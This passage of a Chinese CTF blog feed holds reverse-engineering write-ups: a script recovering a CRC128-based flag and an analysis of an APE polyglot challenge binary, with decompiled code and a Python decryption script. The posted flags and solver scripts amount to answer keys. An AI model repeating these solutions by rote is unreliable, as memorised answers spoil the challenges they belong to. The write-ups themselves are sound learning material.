class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(a, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> m[t][a] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line">        m[a], m[t] = m[t], m[a]</span><br><span class="line">        v[a], v[t] = v[t], v[a]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">            <span class="keyword">if</span> m[i][a] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">                    m[i][j] ^= m[a][j]</span><br><span class="line">                v[i] ^= v[a]</span><br><span class="line">    r = [<span class="literal">None</span>] * d</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">        r[i] = v[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            r[i] ^= r[j] &amp; m[i][j]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">bittest = <span class="keyword">lambda</span> x, p: (x &amp; (<span class="number">1</span> &lt;&lt; p)) <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">matrix = [[<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">xor_data = crc128(<span class="built_in">bytes</span>(<span class="number">22</span>)) ^ _crc128(<span class="string">b&#x27;flag&#123;&#x27;</span>+<span class="built_in">bytes</span>(<span class="number">16</span>)+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">crcs = <span class="built_in">tuple</span>(_crc128(<span class="built_in">bytes</span>(<span class="number">5</span> + (i &gt;&gt; <span class="number">3</span>)) + (<span class="built_in">bytes</span>((<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>),)) + <span class="built_in">bytes</span>(<span class="number">16</span> - (i &gt;&gt; <span class="number">3</span>)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        matrix[i][j] = bittest(crcs[j], i)</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            matrix[i][j] = <span class="number">1</span> ^ matrix[i][j]</span><br><span class="line">vec = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i: bittest(xor_data, i), <span class="built_in">range</span>(<span class="number">128</span>)))</span><br><span class="line">m2 = [<span class="built_in">list</span>(m) <span class="keyword">for</span> m <span class="keyword">in</span> matrix]</span><br><span class="line">v2 = <span class="built_in">list</span>(vec)</span><br><span class="line">result = solve(matrix, vec)</span><br><span class="line"><span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(m2):</span><br><span class="line">    x = v2[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        x ^= result[i] &amp; m[i]</span><br><span class="line">    <span class="keyword">assert</span> x == <span class="number">0</span></span><br><span class="line">flag_fmt = <span class="string">b&#x27;flag&#123;%s&#125;&#x27;</span></span><br><span class="line">content = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        x |= result[i &lt;&lt; <span class="number">3</span> | j] &lt;&lt; j</span><br><span class="line">    content.append(x)</span><br><span class="line">flag = flag_fmt % content</span><br><span class="line"><span class="keyword">assert</span> content == crc128(flag).to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>((flag_fmt % hexlify(content)).decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure><p>这个题我感觉还是很有用的，学到了这样一个性质（<code>x</code>和<code>y</code>是同长度的位向量）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRC(x ^ y) = CRC(x) ^ CRC(y)</span><br></pre></td></tr></table></figure><p>用这个我们就可以实现文件CRC自校验了。还有，我们利用这一性质可以生成Zip Quine，就是<a href="https://research.swtch.com/zip">这篇文章</a>中提到的，简单的来说，就是一个Zip文件，它在解压后的结果是它自身，也就是无论我们解压这个文件多少次，最终解压结果都和源文件没有区别，就像这个附件：<br><a download href="http://swtch.com/r.zip" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></p><blockquote><p>flag{670344c379b7f7fa4555a50fbabaefa4}</p></blockquote><h2 id="第五空间-Universal"><a href="#第五空间-Universal" class="headerlink" title="第五空间 Universal"></a>第五空间 Universal</h2><blockquote><p>wherever &amp;&amp; universal</p><a download href="/archives/Mixed01/Challenge.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></blockquote><p>这个附件没有后缀，我一开始以为这是个ELF文件，但DiE扫描结果显示这是PE文件？！！我赶紧用记事本打开代码，确实是MZ头，但是——</p><p><img src="/pictures/Mixed01/02.png" alt="奇怪的PE文件"></p><p>感觉DOS头有点奇怪，而且为什么PE文件会有shell代码？继续往下翻，看到一个网址：</p><p><img src="/pictures/Mixed01/03.png" alt="一个网址"></p><p>访问<a href="https://justine.lol/ape.html">这个网址</a>，里面介绍这是一个APE文件，即在Windows上能以PE文件运行，在Linux上能以Shell脚本文件运行。这个设计非常巧妙，它忽略了原来的DOS头，并让它被Linux解释成赋值语句，这样两种平台都能正确处理文件，运行高效的Native代码而不是脚本。用IDA载入程序，能显示函数，但IDA没有正确显示参数列表。查看对应的汇编，发现这个调用约定是Linux的，也就是通过<code>rdi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>传递参数。而IDA不知道这一点，于是参数解析就乱套了。在网上找了一圈，没能找到怎么修改IDA的解析方式，那我们只能先从Linux版本入手了。</p><p>Linux中输入<code>sh Challenge</code>运行这个程序，发现没有任何结果，也没有错误代码。但是我们可以按Shell脚本的方式修改这个文件，比如把它的第二句改成<code>sleep 10</code>（但是要注意用十六进制编辑器改，否则数据就错位了），发现程序确实暂停了10秒。观察这个脚本，发现程序如果没有检测到<code>ape</code>命令，就把自己的<code>ape</code>文件提取到临时目录，然后运行这个文件，以程序自身和其余参数为参数执行。我们可以先把Shell脚本修改一下，使之能把<code>ape</code>提取到我们已知的目录，最终我们得到了一个8KB的文件。<a download href="/archives/Mixed01/ape.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>文件下载</a></p><p>那我们直接运行这个文件，以<code>Challenge</code>为参数，没有错误，但不知道是否运行成功。用IDA查看里面仅有的几个函数，没发现提取ELF的，那应该就是内存加载了。给这个程序下断点，从IDA远程运行，按F8执行程序直到<code>rip</code>指向的地址发生突变（比如跳到另一个内存段），可以看到最后<code>rip</code>指向0x200C9D处的<code>retn</code>。随后程序就跳到了<code>0x4023C2</code>处。Ctrl+S查看段名，正是我们要的Challenge。</p><p>然后我们就可以构造一个能让IDA分析的ELF了。把这些段抠出来，然后写了<code>empty.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> __attribute__((section(<span class="string">&quot;.text&quot;</span>))) code[] = &#123;...&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> __attribute__((section(<span class="string">&quot;.data&quot;</span>))) data[] = &#123;...&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> __attribute__((section(<span class="string">&quot;.data&quot;</span>))) data_pad[<span class="number">0xA000</span>];</span><br></pre></td></tr></table></figure><p>这个程序不需要写<code>main</code>函数，因为我们稍后手动指定程序的入口点。运行下面的命令，成功制作出可以运行的ELF文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc empty.c -c -o chall.o &amp;&amp; ld -static -e 0x4023C2 -o chall chall.o &amp;&amp; rm chall.o</span><br></pre></td></tr></table></figure><p>这时比赛已经结束了，在这之前，@zsky大佬通过动态调试PE发现flag是通过命令行的方式输入的，而且输入正确会显示<code>Good Job</code>，关键函数是<code>sub_402747</code>。我们直接利用这一结论，查看此函数，与之前直接分析PE相比，这次IDA能正常识别函数参数了，那么ELF的制作应该是成功了！</p><p>这个文件不能替代原始文件，因为它无法感知输入命令行的参数。但是我们可以静态分析这个程序，定位到关键函数，稍微处理一下符号名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">checkflag</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int128 v5; <span class="comment">// xmm1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v12[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE flag[<span class="number">33</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">8LL</span>;</span><br><span class="line">    v3 = &amp;flag[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">while</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v3++ = <span class="number">0</span>;</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = argv[<span class="number">1</span>];</span><br><span class="line">    v5 = *((_OWORD *)v4 + <span class="number">1</span>);</span><br><span class="line">    *(_OWORD *)flag = *(_OWORD *)v4;</span><br><span class="line">    *(_OWORD *)&amp;flag[<span class="number">16</span>] = v5;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)v12 = <span class="number">0x9E3779B9DEADBEEF</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v12[<span class="number">4</span>] = <span class="number">0x9E3779B9DEADBEEF</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v12[<span class="number">2</span>] = <span class="number">0xBEEFDEEDC6EF3720</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v12[<span class="number">6</span>] = <span class="number">0xBEEFDEEDC6EF3720</span>LL;</span><br><span class="line">      sub_40553C((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)flag, (<span class="keyword">int</span> *)&amp;flag[<span class="number">12</span>], v12);</span><br><span class="line">      sub_40553C((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;flag[<span class="number">4</span>], (<span class="keyword">int</span> *)&amp;flag[<span class="number">8</span>], v12);</span><br><span class="line">      sub_40553C((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;flag[<span class="number">16</span>], (<span class="keyword">int</span> *)&amp;flag[<span class="number">24</span>], v12);</span><br><span class="line">      sub_40553C((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;flag[<span class="number">20</span>], (<span class="keyword">int</span> *)&amp;flag[<span class="number">28</span>], v12);</span><br><span class="line">      v7 = (<span class="keyword">unsigned</span> __int8)add(flag[<span class="number">0</span>], flag[<span class="number">31</span>]);</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v6++;</span><br><span class="line">        v9 = v8 &amp; <span class="number">0x1F</span>;</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7 ^ (<span class="keyword">unsigned</span> __int8)~(flag[v9] ^ flag[v6 &amp; <span class="number">0x1F</span>]);</span><br><span class="line">        flag[v9] = v7 ^ ~(flag[v9] ^ flag[v6 &amp; <span class="number">0x1F</span>]);</span><br><span class="line">        v11 = add(v7, v10);</span><br><span class="line">        v7 = v11;</span><br><span class="line">        LOBYTE(v7) = v11 ^ <span class="number">0xA5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">64</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">memcmp</span>((<span class="keyword">unsigned</span> __int8 *)check, flag, <span class="number">32uLL</span>) )</span><br><span class="line">        ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_405595)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以写出对应的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">memoryview</span>(<span class="built_in">bytearray</span>(<span class="string">b&#x27;00000000111111112222222233333333&#x27;</span>))</span><br><span class="line">maps = (</span><br><span class="line">    (<span class="number">0x4</span>, <span class="number">0xE</span>, <span class="number">0x0</span>, <span class="number">0xF</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xD</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xC</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0x6</span>),</span><br><span class="line">    (<span class="number">0xD</span>, <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xF</span>, <span class="number">0x3</span>, <span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xE</span>, <span class="number">0x7</span>, <span class="number">0xC</span>, <span class="number">0x1</span>, <span class="number">0x8</span>),</span><br><span class="line">    (<span class="number">0xF</span>, <span class="number">0xC</span>, <span class="number">0xA</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xE</span>, <span class="number">0x2</span>, <span class="number">0xB</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x3</span>),</span><br><span class="line">    (<span class="number">0xD</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xA</span>, <span class="number">0x7</span>, <span class="number">0xB</span>, <span class="number">0xC</span>, <span class="number">0x3</span>, <span class="number">0xE</span>, <span class="number">0xF</span>),</span><br><span class="line">    (<span class="number">0xB</span>, <span class="number">0x3</span>, <span class="number">0xE</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0xD</span>, <span class="number">0xC</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0xA</span>, <span class="number">0xF</span>),</span><br><span class="line">    (<span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xB</span>, <span class="number">0xF</span>, <span class="number">0x5</span>, <span class="number">0xC</span>, <span class="number">0x4</span>, <span class="number">0xE</span>, <span class="number">0xD</span>, <span class="number">0xA</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x7</span>),</span><br><span class="line">    (<span class="number">0x3</span>, <span class="number">0xA</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0xB</span>, <span class="number">0xD</span>, <span class="number">0xC</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0xE</span>, <span class="number">0xF</span>),</span><br><span class="line">    (<span class="number">0x3</span>, <span class="number">0xF</span>, <span class="number">0xE</span>, <span class="number">0xA</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0xC</span>, <span class="number">0xB</span>, <span class="number">0x8</span>),</span><br><span class="line">)</span><br><span class="line"><span class="comment"># umaps[t][maps[t][i]] == i</span></span><br><span class="line">umaps = <span class="built_in">tuple</span>(<span class="built_in">map</span>(</span><br><span class="line">    <span class="keyword">lambda</span> m: <span class="built_in">tuple</span>(<span class="built_in">map</span>(</span><br><span class="line">        <span class="keyword">lambda</span> e: e[<span class="number">0</span>],</span><br><span class="line">        <span class="built_in">sorted</span>(<span class="built_in">enumerate</span>(m), key=<span class="keyword">lambda</span> e: e[<span class="number">1</span>])</span><br><span class="line">    )), maps</span><br><span class="line">))</span><br><span class="line">map2 = (*<span class="built_in">range</span>(<span class="number">8</span>), *<span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">8</span>)), *<span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">8</span>)), *<span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">8</span>)))</span><br><span class="line">map3 = (<span class="number">0xDEADBEEF</span>, <span class="number">0x9E3779B9</span>, <span class="number">0xC6EF3720</span>, <span class="number">0xBEEFDEED</span>, <span class="number">0xDEADBEEF</span>, <span class="number">0x9E3779B9</span>, <span class="number">0xC6EF3720</span>, <span class="number">0xBEEFDEED</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle</span>(<span class="params">v, maps</span>):</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r |= maps[i][v &gt;&gt; (i &lt;&lt; <span class="number">2</span>) &amp; <span class="number">15</span>] &lt;&lt; (i &lt;&lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span>(<span class="params">v1, v2</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> map2:</span><br><span class="line">        v1, v2 = shuffle(map3[i] ^ v1 ^ v2, maps), v1</span><br><span class="line">    <span class="keyword">return</span> v2, v1</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uround</span>(<span class="params">v1, v2</span>):</span></span><br><span class="line">    v1, v2 = v2, v1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(map2):</span><br><span class="line">        v1, v2 = v2, shuffle(v1, umaps) ^ map3[i] ^ v2</span><br><span class="line">    <span class="keyword">return</span> v1, v2</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt part 1</span></span><br><span class="line">view = flag.cast(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">view[<span class="number">0</span>], view[<span class="number">3</span>] = <span class="built_in">round</span>(view[<span class="number">0</span>], view[<span class="number">3</span>])</span><br><span class="line">view[<span class="number">1</span>], view[<span class="number">2</span>] = <span class="built_in">round</span>(view[<span class="number">1</span>], view[<span class="number">2</span>])</span><br><span class="line">view[<span class="number">4</span>], view[<span class="number">6</span>] = <span class="built_in">round</span>(view[<span class="number">4</span>], view[<span class="number">6</span>])</span><br><span class="line">view[<span class="number">5</span>], view[<span class="number">7</span>] = <span class="built_in">round</span>(view[<span class="number">5</span>], view[<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt part 2</span></span><br><span class="line">view = flag.cast(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="built_in">sum</span> = view[<span class="number">0</span>] + view[<span class="number">31</span>] &amp; <span class="number">255</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    p, q = i &amp; <span class="number">31</span>, (i + <span class="number">1</span>) &amp; <span class="number">31</span></span><br><span class="line">    view[p] ^= <span class="built_in">sum</span> ^ view[q] ^ <span class="number">255</span></span><br><span class="line">    <span class="built_in">sum</span> = (<span class="built_in">sum</span> + view[p] ^ <span class="number">0xA5</span>) &amp; <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check simulation result</span></span><br><span class="line"><span class="keyword">assert</span> flag == unhexlify(<span class="string">&#x27;49aac7d93975a0d180c3d175a1250e6ab98ebb23f163421071d343657bed1954&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypted flag</span></span><br><span class="line">flag = <span class="built_in">memoryview</span>(<span class="built_in">bytearray</span>((</span><br><span class="line">    <span class="number">0xC2</span>, <span class="number">0x3A</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x44</span>, <span class="number">0x07</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x7B</span>, <span class="number">0xBE</span>, <span class="number">0x1A</span>, <span class="number">0x6D</span>, <span class="number">0xCB</span>, <span class="number">0xFA</span>, <span class="number">0x26</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0x9F</span>, <span class="number">0x1C</span>, <span class="number">0xD9</span>, <span class="number">0x99</span>, <span class="number">0x44</span>, <span class="number">0xC3</span>, <span class="number">0xB7</span>, <span class="number">0x1D</span>, <span class="number">0x67</span>, <span class="number">0x3C</span>, <span class="number">0x7B</span>, <span class="number">0x80</span></span><br><span class="line">)))</span><br><span class="line">view = flag.cast(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="comment"># seems irreversible encrypt? enumerate final sum</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">sum</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    viewc = <span class="built_in">memoryview</span>(<span class="built_in">bytearray</span>(view))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">64</span>)):</span><br><span class="line">        p, q = i &amp; <span class="number">31</span>, (i + <span class="number">1</span>) &amp; <span class="number">31</span></span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> ^ <span class="number">0xA5</span>) - viewc[p] &amp; <span class="number">255</span></span><br><span class="line">        viewc[p] ^= <span class="built_in">sum</span> ^ viewc[q] ^ <span class="number">255</span></span><br><span class="line">    <span class="comment"># check initial sum</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> == (viewc[<span class="number">0</span>] + viewc[<span class="number">31</span>] &amp; <span class="number">255</span>):</span><br><span class="line">        viewc = viewc.cast(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        viewc[<span class="number">0</span>], viewc[<span class="number">3</span>] = uround(viewc[<span class="number">0</span>], viewc[<span class="number">3</span>])</span><br><span class="line">        viewc[<span class="number">1</span>], viewc[<span class="number">2</span>] = uround(viewc[<span class="number">1</span>], viewc[<span class="number">2</span>])</span><br><span class="line">        viewc[<span class="number">4</span>], viewc[<span class="number">6</span>] = uround(viewc[<span class="number">4</span>], viewc[<span class="number">6</span>])</span><br><span class="line">        viewc[<span class="number">5</span>], viewc[<span class="number">7</span>] = uround(viewc[<span class="number">5</span>], viewc[<span class="number">7</span>])</span><br><span class="line">        <span class="comment"># check ascii flag</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= c &lt; <span class="number">127</span> <span class="keyword">for</span> c <span class="keyword">in</span> viewc.cast(<span class="string">&#x27;B&#x27;</span>)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>(viewc).decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure><p>加密分为两个阶段：首先把flag切分为4组，每组两个32位整数，把它们分别进行费斯妥加密（大概）。然后再进行两轮按字节循环加密<del>学术名字叫什么我也不知道</del>。然而，我在后面解密的时候发现，第二轮加密是不可逆的？？？好在枚举并不复杂，约束条件也比较好找，只要保证最后是ascii字符就可以了。</p><blockquote><p>S3hr0din7er_3_Uni4er3al_D00rs111</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>光速虚拟机逆向分析 --verbose</title>
